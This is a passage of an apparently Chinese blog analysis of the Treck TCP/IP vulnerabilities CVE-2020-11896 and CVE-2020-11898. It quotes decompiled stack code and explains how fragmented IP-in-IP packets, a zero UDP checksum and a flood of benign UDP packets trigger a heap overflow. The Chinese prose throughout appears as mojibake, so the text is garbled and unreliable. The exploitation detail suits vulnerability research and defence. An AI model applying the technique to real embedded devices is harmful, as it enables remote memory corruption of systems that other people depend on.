ä¸ªå­—èŠ‚ï¼‰ã€‚å¦‚æœæœ‰IPé€‰é¡¹ï¼Œå¤´é•¿åº¦å˜å¤§ï¼Œæœ€å¤šå€¼çš„0xfï¼ˆ60ä¸ªå­—èŠ‚ï¼‰ã€‚  </p><p><em>â€¢</em> æ€»é•¿åº¦ï¼ˆ2ä¸ªå­—èŠ‚ï¼‰ï¼šæ•´ä¸ªIPæ•°æ®åŒ…çš„å¤§å°ï¼Œä»¥å­—èŠ‚ï¼ˆæˆ–IPç‰‡æ®µï¼Œå¦‚æœæ˜¯åˆ†æ®µçš„ï¼‰ä¸ºå•ä½ï¼ŒåŒ…æ‹¬æŠ¥å¤´ã€‚  </p><p>å‡½æ•°tfIpIncomingPacket ä»ä¸€äº›åŸºæœ¬çš„å¥å…¨æ€§æ£€æŸ¥å¼€å§‹ã€‚é™¤äº†éªŒè¯æ ‡å¤´æ ¡éªŒå’Œä¹‹å¤–ï¼Œå®ƒè¿˜éªŒè¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip_version &#x3D;&#x3D; 4 &amp;&amp; data_available &gt;&#x3D; 21 &amp;&amp; header_length &gt;&#x3D; 20 &amp;&amp; total_length &gt; header_length &amp;&amp; total_length &lt;&#x3D; data_available</span><br></pre></td></tr></table></figure><p>â€œå¯ç”¨æ•°æ®â€æ˜¯ä½¿ç”¨å­—æ®µpktuChainDataLengthæµ‹é‡çš„ã€‚<br>å¦‚æœæ‰€æœ‰å¥å…¨æ€§æ£€æŸ¥éƒ½é€šè¿‡ï¼Œè¯¥å‡½æ•°å°†æ£€æŸ¥IPæŠ¥å¤´ä¸­æŒ‡å®šçš„æ€»é•¿åº¦æ˜¯å¦ä¸¥æ ¼å°äºæ•°æ®åŒ…çš„pktuChainDataLengthï¼Œè¡¨æ˜å®é™…æ¥æ”¶çš„æ•°æ®å¤šäºIPæŠ¥å¤´ä¸­æ‰€è¿°çš„æ•°æ®ã€‚å¦‚æœä¸ºçœŸï¼Œåˆ™æ‰§è¡Œä¿®å‰ªæ“ä½œä»¥åˆ é™¤é¢å¤–æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)ipTotalLength &lt;= pkt-&gt;pktuChainDataLength) &#123; <span class="keyword">if</span> ((uint)ipTotalLength != pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">pkt-&gt;pktuChainDataLength = (uint)ipTotalLength; </span><br><span class="line">pkt-&gt;pktuLinkDataLength = (uint)ipTotalLength;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ¼æ´æ‰€åœ¨ã€‚å›æƒ³ä¸€ä¸‹ï¼ŒpktuLinkDataLengthä¿å­˜å½“å‰ç‰‡æ®µçš„å¤§å°ï¼ŒpktuChainDataLengthä¿å­˜æ•´ä¸ªæ•°æ®åŒ…çš„å¤§å°ã€‚å¦‚æœæ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œåˆ™ä¼šåˆ›å»ºä¸ä¸€è‡´ï¼Œå…¶ä¸­pkt-&gt;pktuChainDataLengthã€‚<br>==pkt-&gt;pktuLinkDataLengthï¼Œä½†å¯èƒ½æœ‰å…¶ä»–ç‰‡æ®µæŒ‡å‘ã€‚<br>pkt-&gt;pktuLinkNextPtr.ã€‚å¦ä¸€ç§æ–¹å¼æ˜¯å°†å…¶è§†ä¸ºä¸€ç§è™šæ„çš„ä¸ä¸€è‡´çŠ¶æ€ï¼Œå…¶ä¸­é“¾è¡¨ä¸Šç‰‡æ®µçš„æ€»å¤§å°å¤§äºpktuChainDataLengthä¸­å­˜å‚¨çš„å¤§å°ã€‚<br>ç”±å¼±ä¿®å‰ªæ“ä½œäº§ç”Ÿçš„ä¸ä¸€è‡´å¯¹äºå¤„ç†çš„å…¶ä½™éƒ¨åˆ†æ¥è¯´ä¸æ˜¯å¥½å…†å¤´ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æœ‰å¦ä¸€ä¸ªæŒ‘æˆ˜éœ€è¦å…‹æœã€‚æ¯æ¬¡ä½¿ç”¨ä¸€ä¸ªæ¥æ”¶åˆ°çš„ç‰‡æ®µè°ƒç”¨tfIpIncomingPacketå‡½æ•°ï¼Œå¹¶è°ƒç”¨tfIpReAssemblePacketæ¥å¤„ç†å®ƒã€‚tfIpReAssemblePacketè´Ÿè´£å°†ç‰‡æ®µæ’å…¥åˆ°ä¸Šè¿°é“¾è¡¨ä¸­ã€‚å®ƒä¸ä¼šå°†ç‰‡æ®µå¤åˆ¶åˆ°è¿ç»­çš„å†…å­˜ç¼“å†²åŒºã€‚æ”¶åˆ°æ‰€æœ‰ç‰‡æ®µåï¼ŒtfIpReAssemblePacketä»¥ç‰‡æ®µé“¾æ¥åˆ—è¡¨çš„å½¢å¼è¿”å›å®Œæ•´çš„æ•°æ®åŒ…ï¼Œä»¥ä¾¿åœ¨ä¸‹ä¸€ä¸ªåè®®å±‚è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚è¯¥é‡ç»„æ“ä½œåœ¨æ˜“å—æ”»å‡»çš„ä¿®å‰ªæ“ä½œä¹‹åæ‰§è¡Œã€‚ä¸€æ—¦å¯é çš„æ“ä½œå®Œæˆï¼ŒtfIpIncomingPacketå°†è¿”å›æˆ–è½¬å‘æ•°æ®åŒ…ï¼Œä»¥ä¾¿åœ¨ä¸‹ä¸€ç½‘ç»œå±‚(ä¾‹å¦‚ï¼šUDP)è¿›è¡Œå¤„ç†ã€‚è¿™ä¼šé˜»æ­¢æˆ‘ä»¬æ‰§è¡Œåˆ©ç”¨æ¼æ´æ”»å‡»ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦åˆ†æ®µçš„æ•°æ®åŒ…æ‰èƒ½è¾¾åˆ°ä¸ä¸€è‡´çš„çŠ¶æ€ã€‚æ¢å¥è¯è¯´ï¼Œæ˜“å—æ”»å‡»çš„ä»£ç åº”è¯¥åªåœ¨æ¯ä¸ªç‰‡æ®µçš„åŸºç¡€ä¸Šæ‰§è¡Œ(æˆ–åœ¨å•ä¸ªç‰‡æ®µçš„æ•°æ®åŒ…ä¸Šæ‰§è¡Œ)ã€‚å¦‚æœä»¥è¿™ç§æ–¹å¼æ‰§è¡Œï¼Œå®ƒå®é™…ä¸Šå¹¶ä¸å®¹æ˜“å—åˆ°æ”»å‡»ã€‚<br>é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•æ‰èƒ½ç”¨ä¼ å…¥çš„ç¢ç‰‡æ•°æ®è§¦å‘æ˜“å—æ”»å‡»çš„ä¿®å‰ªæµï¼Œä»è€Œå®ç°ä¸Šè¿°ä¸ä¸€è‡´å‘¢ï¼Ÿ</p><h4 id="åœ¨IPå±‚å¤„ç†åˆ†æ®µæ•°æ®åŒ…"><a href="#åœ¨IPå±‚å¤„ç†åˆ†æ®µæ•°æ®åŒ…" class="headerlink" title="åœ¨IPå±‚å¤„ç†åˆ†æ®µæ•°æ®åŒ…"></a>åœ¨IPå±‚å¤„ç†åˆ†æ®µæ•°æ®åŒ…</h4><p>ä¸ºäº†ä½¿åˆ†æ®µçš„æ•°æ®åŒ…åœ¨IPå±‚å¾—åˆ°å¤„ç†å¹¶åˆ°è¾¾æ˜“å—æ”»å‡»çš„æµï¼Œæˆ‘ä»¬ä½¿ç”¨éš§é“ã€‚<br>éš§é“å…è®¸tfIpIncomingPacketå°†å†…éƒ¨IPæ•°æ®åŒ…ä½œä¸ºéåˆ†æ®µæ•°æ®åŒ…è¿›è¡Œå¤„ç†ã€‚å‡½æ•°tfIpIncomingPacketå°†è¢«é€’å½’è°ƒç”¨ä¸¤æ¬¡ï¼Œä¸€æ¬¡ç”¨äºIPéš§é“çš„å†…å±‚ï¼Œå¤šæ¬¡ç”¨äºå¤–å±‚(æ¯ä¸ªç‰‡æ®µä¸€æ¬¡)ã€‚é¦–å…ˆï¼ŒtfIpIncomingPacketå°†æ¥æ”¶æ¥è‡ªå¤–å±‚çš„æ‰€æœ‰ç‰‡æ®µï¼Œåœ¨æ¯ä¸ªç‰‡æ®µä¸Šè°ƒç”¨tfIpReAssemblePacketï¼Œä¸€æ—¦å®ƒä»¬éƒ½è¢«æ¥æ”¶ï¼Œå®ƒå°†æŠŠæ‰§è¡Œä¼ é€’åˆ°ä¸‹ä¸€ä¸ªåè®®å±‚ï¼Œåœ¨æœ¬ä¾‹ä¸­å†æ¬¡æ˜¯IPv4ï¼Œå› æ­¤å°†ä»å…·æœ‰å†…éƒ¨IPå±‚çš„tfIpIncomingPacketè°ƒç”¨tfIpIncomingPacketã€‚</p><p><a href="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" title="img" class="gallery-item"><img src="https://lh5.googleusercontent.com/xX_OIWoDTddPFXkKXpjKXd5tROmOlFf7V-xipWAHODKoI1Ke_dk23YSytZYHTHZ50I67C4hCKqbHbQzaGBKXi5u24BTDy_ulnsLTbgHyKxXtKB0UfS8Yec-Jz01QcISgvik_I5Y" alt="img"></a></p><p>å¯¹å¤–éƒ¨IPåˆ†ç»„è¿›è¡Œåˆ†æ®µä¼šå¯¼è‡´ä½¿ç”¨å†…éƒ¨åˆ†ç»„è°ƒç”¨tfIpIncomingPacketï¼Œè¯¥å†…éƒ¨åˆ†ç»„ç°åœ¨ç”±å‡ ä¸ªåˆ†æ®µç»„æˆï¼Œä½†åœ¨IPæŠ¥å¤´ä¸­æ ‡è®°ä¸ºæœªåˆ†æ®µ(MF=0)ã€‚å°±æè¿°æ•°æ®åŒ…çš„æ•°æ®ç»“æ„è€Œè¨€ï¼Œå®ƒç°åœ¨ç”±é“¾æ¥åˆ—è¡¨ä¸­çš„å‡ ä¸ªå•ç‹¬çš„é“¾æ¥ç»„æˆï¼Œæ¯ä¸ªé“¾æ¥éƒ½æœ‰ä¸€ä¸ªå•ç‹¬çš„pktuLinkDataLengthå€¼ã€‚</p><p>è®©æˆ‘ä»¬è¯´å¾—æ›´å…·ä½“äº›ã€‚è¯·è€ƒè™‘ä¸‹é¢çš„ç¤ºä¾‹ï¼Œå®ƒå°†ä¼´éšæˆ‘ä»¬å®Œæˆæœ¬æ–‡ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" title="image-20200630192655708" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630192657.png" alt="image-20200630192655708"></a></p><p>(æˆ‘ä»¬å°† checksum å­—æ®µè®¾ç½®ä¸º0ï¼Œå› ä¸ºè¿™å°†å¯¼è‡´è·³è¿‡UDPæ ¡éªŒå’ŒéªŒè¯ã€‚)ã€‚<br>å½“ç½‘ç»œå †æ ˆå¤„ç†å¤–éƒ¨ç‰‡æ®µæ—¶ï¼Œå®ƒä½¿ç”¨å­—æ®µå°†å®ƒä»¬é“¾æ¥èµ·æ¥ã€‚<br>å¦‚å‰æ‰€è¿°ï¼ŒtsUserPacketç»“æ„ä¸­çš„pktuLinkNextPtrã€‚å½“å‡½æ•°tfIpIncomingPacketå¤„ç†å†…éƒ¨IPåŒ…(ç”±äºåè®®=4)æ—¶ï¼Œå®ƒæ­£åœ¨å¤„ç†ä¼ å…¥çš„åˆ†ç‰‡æ•°æ®(å†…éƒ¨IPåŒ…ç”±ä¸¤ä¸ªé“¾æ¥åœ¨ä¸€èµ·çš„tsPacketç»“æ„è¡¨ç¤º)ï¼Œä½†ä»ä¼šè°ƒç”¨æ˜“å—æ”»å‡»çš„æµï¼Œä»è€Œè§£å†³äº†æˆ‘ä»¬çš„æŒ‘æˆ˜ã€‚<br>æ­¤å¤–ï¼Œå†…éƒ¨IPåˆ†ç»„é€šè¿‡IPæŠ¥å¤´å¥å…¨æ€§æ£€æŸ¥ï¼Œå› ä¸ºåªè€ƒè™‘tsUserPacketçš„pktuChainDataLengthå­—æ®µ(è€Œä¸æ˜¯pktuLinkDataLength)ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œå†…éƒ¨IPæ•°æ®åŒ…(32)çš„æ€»é•¿åº¦è¾ƒå°ã€‚<br>è¶…è¿‡é“¾æ•°æ®é•¿åº¦(1000+8+20=1028)ï¼Œå› æ­¤Treckå †æ ˆå°†é€šè¿‡å°†å­—æ®µpktuLinkDataLengthå’ŒpktuChainDataLengthè®¾ç½®ä¸ºç›¸åŒçš„å€¼-æ€»IPé•¿åº¦(åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ä¸º32)ï¼Œæ¥å°è¯•ä¸æ­£ç¡®åœ°ä¿®å‰ªæ•°æ®åŒ…ã€‚è¿™å¯¼è‡´å†…éƒ¨IPåˆ†ç»„ç”±é“¾æ¥åœ¨ä¸€èµ·çš„ä¸¤ä¸ªtsPacketç»“æ„è¡¨ç¤ºï¼Œä½†æ˜¯å®ƒä»¬çš„æ€»CUSIZEå¤§äºpktuChainDataLengthå­—æ®µ(pktuChainDataLengthå­—æ®µåœ¨ä¿®æ•´åç­‰äº32ï¼Œè€Œä¸æ˜¯1028å­—èŠ‚)ã€‚</p><p><a href="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" title="img" class="gallery-item"><img src="https://lh3.googleusercontent.com/1AvUvDvuhRYsbIROhXpYD1sVtZA7VL1PV5I11ZHdDiIBT2-K2PpJfq4ousnjqaHhyr7DeSL-dhpQnA1b1SvBsYCjkeTTuCAhT-b5k65-71DlHm-RxGUSaoeeMnZXQdkbnk3mrU8" alt="img"></a></p><h4 id="åˆ©ç”¨UDPå®ç°å †æº¢å‡º"><a href="#åˆ©ç”¨UDPå®ç°å †æº¢å‡º" class="headerlink" title="åˆ©ç”¨UDPå®ç°å †æº¢å‡º"></a>åˆ©ç”¨UDPå®ç°å †æº¢å‡º</h4><p>æ—¢ç„¶æˆ‘ä»¬å·²ç»è¾¾åˆ°äº†ä¸ä¸€è‡´çš„çŠ¶æ€ï¼Œæˆ‘ä»¬å°±é¢ä¸´ç€å¦ä¸€ä¸ªé—®é¢˜â€“æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨è¿™ç§ä¸ä¸€è‡´æ¥è·å¾—å†…å­˜æŸååŸè¯­ï¼Ÿ<br>åŸæ¥ï¼Œè‡³å°‘æœ‰ä¸€æ¡ä»£ç è·¯å¾„å°†ç¢ç‰‡æ•°æ®å¤åˆ¶åˆ°å•ä¸ªè¿ç»­ç¼“å†²åŒºä¸­ã€‚è¿™æ˜¯å¤„ç†UDPæ•°æ®æŠ¥çš„ä»£ç çš„ä¸€éƒ¨åˆ†ã€‚è¯¥æµçš„å†…éƒ¨é€»è¾‘ç”±æ­£åœ¨åˆ†é…çš„æ–°åˆ†ç»„(ä½¿ç”¨tfGetSharedBuffer)ç»„æˆï¼Œå…¶å¤§å°åŸºäºpktuChainDataLengthå­—æ®µï¼Œéšåæ˜¯åˆ†ç»„çš„ä¸åŒç‰‡æ®µçš„å‰¯æœ¬é€ä¸ªè¿›å…¥æ–°åˆ†é…çš„åˆ†ç»„ã€‚<br>è´Ÿè´£æ‰§è¡Œå¤åˆ¶çš„å‡½æ•°æ˜¯tfCopyPacketï¼Œå®ƒæŒ‰é¡ºåºæ¥å—æºåŒ…å’Œç›®çš„åŒ…ã€‚ä»¥ä¸‹æ˜¯ç‰‡æ®µå¤åˆ¶ä»£ç çš„æ‘˜å½•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="built_in">memcpy</span>(dst-&gt;pktuLinkDataPtr + i,src-&gt;pktuLinkDataPtr,src-&gt;pktuLinkDataLength); i = i + src-&gt;pktuLinkDataLength;</span><br><span class="line">src = (tsPacket *)src-&gt;pktuLinkNextPtr;</span><br><span class="line">&#125; <span class="keyword">while</span> (src != <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>å¦‚æ‚¨æ‰€è§ï¼Œå‡½æ•°tfCopyPacketæ²¡æœ‰è€ƒè™‘å®ƒå†™å…¥çš„ç¼“å†²åŒºçš„é•¿åº¦ã€‚å®ƒåªæ˜¯ä»srcåŒ…(æˆ‘ä»¬çš„åˆ†æ®µåŒ…)ä¸­æå–æ¯ä¸ªé“¾æ¥ï¼Œå¹¶å°†å…¶æ•°æ®å¤åˆ¶åˆ°ç›®æ ‡åŒ…ä¸­ã€‚ç›®æ ‡æ•°æ®åŒ…æ˜¯æ ¹æ®pktuChainDataLengthåˆ†é…çš„ï¼Œå› æ­¤å¦‚æœä¹‹å‰è§¦å‘äº†è¯¥æ¼æ´ï¼Œåˆ™åœ¨æˆ‘ä»¬çš„æ— æ•ˆä¹‹åï¼Œåˆ†é…çš„ç¼“å†²åŒºå¯èƒ½å°äºæ•°æ®åŒ…ä¸­æ‰€æœ‰å•ä¸ªé“¾æ¥çš„æ€»å’Œ-å› æ­¤ï¼Œä¼šå‘ç”Ÿå †æº¢å‡ºã€‚</p><p>è¿˜æœ‰ä¸€ä»¶äº‹éœ€è¦æè¿°ï¼Œé‚£å°±æ˜¯æˆ‘ä»¬å¦‚ä½•è§¦å‘è¿™ä¸€æµç¨‹ã€‚</p><p>å¦‚æœåº”ç”¨ç¨‹åºæ­£åœ¨ä¾¦å¬ä»»ä½•UDPç«¯å£ï¼Œåˆ™å‘å¾€è¯¥ç«¯å£çš„UDPæ•°æ®åŒ…å°†è¢«ä¼ é€’ç»™å¥—æ¥å­—å¤„ç†å‡½æ•°tfSocketIncomingPacketã€‚å…¶ä»»åŠ¡æ˜¯å°†æ•°æ®åŒ…é™„åŠ åˆ°å¥—æ¥å­—æ¥æ”¶é˜Ÿåˆ—(ç¨åç”±åº”ç”¨å±‚è½®è¯¢)ã€‚</p><p>åœ¨æˆ‘ä»¬çš„ç ”ç©¶ä¸­ï¼Œæˆ‘ä»¬å‘ç°å½“UDPæ•°æ®åŒ…çš„å¥—æ¥å­—æ¥æ”¶é˜Ÿåˆ—éç©ºå¹¶ä¸”æœ‰æ–°çš„æ•°æ®åŒ…åˆ°è¾¾æ—¶ï¼Œä¸Šè¿°åŒ…å«å †æº¢å‡ºçš„æµæ˜¯å¯ä»¥å®ç°çš„ã€‚è¯·çœ‹tfSocketIncomingPacketçš„ä»¥ä¸‹æ‘˜å½•ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ocal_10 = pkt;</span><br><span class="line"><span class="comment">/* ... */</span></span><br><span class="line"><span class="keyword">if</span> (sockEntry-&gt;socReceiveQueueNextPtr == <span class="literal">NULL</span>) &#123; sockEntry-&gt;socReceiveQueueNextPtr = pkt; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">queueLastPtr = sockEntry-&gt;socReceiveQueueLastPtr;</span><br><span class="line"><span class="keyword">if</span> ((queueLastPtr-&gt;pktSharedDataPtr-&gt;dataFlags &amp; <span class="number">0x40</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">/* Shared data doesn&#x27;t point to user device memory */</span></span><br><span class="line">sizeOfPacketBuffer = (uint)(pkt-&gt;pktSharedDataPtr-&gt;dataBufLastPtr +</span><br><span class="line">â€¹â†’ -(<span class="keyword">int</span>)pkt-&gt;pktSharedDataPtr-&gt;dataBufFirstPtr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (protoNum == <span class="number">6</span>) &#123;</span><br><span class="line"><span class="comment">/* Related to TCP; redacted for brevity */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (sizeOfPacketBuffer != <span class="number">0</span>) &#123;</span><br><span class="line">uVar2 = (uint)sockEntry-&gt;socRecvCopyFraction * pkt-&gt;pktuChainDataLength; <span class="keyword">if</span> (uVar2 &lt;= sizeOfPacketBuffer) &#123;</span><br><span class="line">dst = tfGetSharedBuffer(<span class="number">0x54</span>,pkt-&gt;pktuChainDataLength,<span class="number">0</span>); <span class="keyword">if</span> (dst != <span class="literal">NULL</span>) &#123;</span><br><span class="line">tfCopyPacket(pkt,dst); needToDrop = <span class="literal">true</span>; local_10 = dst;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">queueLastPtr-&gt;pktChainNextPtr = local_10; queueLastPtr = local_10;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°ï¼Œä¸ºäº†åˆ°è¾¾tfGetSharedBufferï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡æ¶‰åŠåˆ°ocRecvCopyFractionçš„æ£€æŸ¥ã€‚æˆ‘ä»¬ä¸çŸ¥é“å®ƒçš„ç¡®åˆ‡ç”¨é€”ï¼Œä½†é€šè¿‡è°ƒè¯•å’Œå®éªŒï¼Œæˆ‘ä»¬å‘ç°å®ƒçš„å€¼æ˜¯4(åœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹)ã€‚</p><p>åœ¨æˆ‘ä»¬åå¤å‡ºç°çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…é“¾è·¯çš„ç¼“å†²åŒºå¤§å°å¾ˆå°ï¼Œå› æ­¤SizzeOfPacketBufferã€‚<br>ç›¸å¯¹è¾ƒå°(å¤§çº¦10så­—èŠ‚)ã€‚<br>ä½†æ˜¯å½“æˆ‘ä»¬åˆ°è¾¾è¯¥æµæ—¶ï¼Œpkt-&gt;pktuChainDataLengthç­‰äº4(ä¿®å‰ªåä¸º32ï¼Œç„¶ååœ¨å¤„ç†IPå±‚æ—¶é€’å‡20(IPæŠ¥å¤´çš„å¤§å°)ï¼Œç„¶åå†æ¬¡é€’å‡8(UDPæŠ¥å¤´çš„å¤§å°))ã€‚å› æ­¤ï¼Œ4*4=16å°äºsizeOfPacketBufferï¼Œæˆ‘ä»¬é€šè¿‡æ­¤æ£€æŸ¥ã€‚<br>æˆ‘ä»¬éœ€è¦ç¡®ä¿çš„æœ€åä¸€ä»¶äº‹æ˜¯UDPæ•°æ®åŒ…çš„æ¥æ”¶é˜Ÿåˆ—æ˜¯éç©ºçš„(å¦åˆ™æ— æ³•åˆ°è¾¾æ­¤æµ)ã€‚åœ¨ç†è®ºä¸Šï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚åœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬å‘ç°å°†å¤šä¸ªUDPæ•°æ®åŒ…è¶³å¤Ÿå¿«åœ°å‘é€åˆ°åŒä¸€ç«¯å£å°±å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ç„¶è€Œï¼Œè¦è®©è¿™ä¸€éƒ¨åˆ†å¯é åœ°å·¥ä½œæ˜¯å¾ˆæ£˜æ‰‹çš„ã€‚è¯¥æ¼æ´æ˜¯ç”¨Pythonç¼–å†™çš„ï¼Œä½¿ç”¨çš„Scapyå¯¹äºæˆ‘ä»¬çš„ç›®çš„æ¥è¯´å¤ªæ…¢äº†ã€‚ä¸ºäº†å…‹æœè¿™ä¸ªéšœç¢ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†Scapyçš„L3Socketå¯¹è±¡ï¼Œå¹¶å®ä¾‹åŒ–äº†ä¸€å †çº¿ç¨‹ï¼Œè¿™äº›çº¿ç¨‹åªä¼šç”¨è‰¯æ€§çš„UDPæ•°æ®åŒ…æ·¹æ²¡è®¾å¤‡ï¼Œå› æ­¤å¥—æ¥å­—æ¥æ”¶é˜Ÿåˆ—å°†æ˜¯éç©ºçš„ã€‚ç”¨Cæˆ–GOç¼–å†™ä»£ç å¯èƒ½ä¹Ÿå¯ä»¥ã€‚æ ¹æ®è¦åˆ©ç”¨çš„è®¾å¤‡å’Œä¾¦å¬æœåŠ¡å™¨ï¼Œå¯ä»¥å¯¹æ­¤éƒ¨åˆ†è¿›è¡Œå…¶ä»–æ”¹è¿›ã€‚<br>å¦ä¸€ä¸ªéšœç¢æ˜¯ï¼Œåœ¨æˆ‘ä»¬åˆ°è¾¾å‘ç”Ÿæº¢å‡ºçš„tfSocketIncomingPacketä¹‹å‰ï¼Œæ˜“å—æ”»å‡»çš„æ•°æ®åŒ…é€šè¿‡tfUdpIncomingPacketã€‚æ­¤å‡½æ•°åŒ…å«ä¸€äº›ä¸UDPç›¸å…³çš„å¥å…¨æ€§æ£€æŸ¥ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦é€šè¿‡è¿™äº›æ£€æŸ¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">udpLen &#x3D; udpHdr-&gt;udpLength &gt;&gt; 8 | udpHdr-&gt;udpLength &lt;&lt; 8;</span><br><span class="line">if ((udpLen &lt; 8) || (*(ushort  *)&amp;pkt-&gt;pktuChainDataLength  &lt;  udpLen))  goto  dropPacket; if (udpLen &lt; *(ushort *)&amp;pkt-&gt;pktuChainDataLength) &#123;</span><br><span class="line">tfPacketTailTrim(pkt,(uint)udpLen,0);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;* ... *&#x2F;</span><br><span class="line">if ((udpHdr-&gt;udpChecksum !&#x3D; 0) &amp;&amp; (tvUdpIncomingChecksumOn !&#x3D; 0)) &#123;</span><br><span class="line">&#x2F;* Compute checksum... *&#x2F;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œé€šè¿‡ç¡®ä¿UDPé•¿åº¦å­—æ®µç­‰äºpktuChainDataLengthå­—æ®µå‡å»å†…éƒ¨IPæŠ¥å¤´çš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…è¿™ç§ç±»å‹çš„ä¿®å‰ª(ä¸è¦ä¸æ˜“å—æ”»å‡»çš„æµæ··æ·†)ã€‚<br>æ€»è€Œè¨€ä¹‹ï¼šå¦‚æœæˆ‘ä»¬çš„è®¾å¤‡ä¸Šæœ‰UDPç«¯å£åœ¨ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥å¿«é€Ÿå‘é€æ•°æ®åŒ…ï¼Œè¿™æ ·å¥—æ¥å­—æ¥æ”¶é˜Ÿåˆ—å°±ä¸ä¼šä¸ºç©ºã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å°†å‘é€ä¼šè§¦å‘è¯¥æ¼æ´çš„é›¶ç¢UDPæ•°æ®åŒ…ï¼Œå¹¶å‹¾é€‰å‡ ä¸ªå¤é€‰æ¡†ã€‚æˆ‘ä»¬é¢„æœŸçš„ç»“æœæ˜¯ä½¿ç”¨tfGetSharedBufferåœ¨å †ä¸Šåˆ†é…ä¸€ä¸ªå°ç¼“å†²åŒºï¼Œç„¶åtfCopyPacketä¼šä½¿å…¶æº¢å‡ºã€‚</p><h2 id="CVE-2020-11898"><a href="#CVE-2020-11898" class="headerlink" title="CVE-2020-11898"></a>CVE-2020-11898</h2><p>å‰é¢æåˆ°äº†ï¼ŒTreck TCP/IPä¸èƒ½æ­£ç¡®å¤„ç†IP-in-IPéš§é“ä¸Šä¼ å…¥çš„IPv4ç‰‡æ®µã€‚è¿™è¿˜å¯èƒ½å…è®¸æœªç»éªŒè¯çš„æ”»å‡»è€…ä» heap ä¸­æ³„æ¼å†…å­˜ã€‚</p><p>å¦‚æœ tfIcmpErrPacket å°†è¶Šç•Œæ•°æ®å¤åˆ¶åˆ°é”™è¯¯æ•°æ®åŒ…ä¸­ï¼Œåˆ™å¯ä½œä¸ºä¿¡æ¯æ³„æ¼æ¼æ´æ¥è¢«åˆ©ç”¨ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200630213503.png" title="image-20200630213501855" class="gallery-item"><img 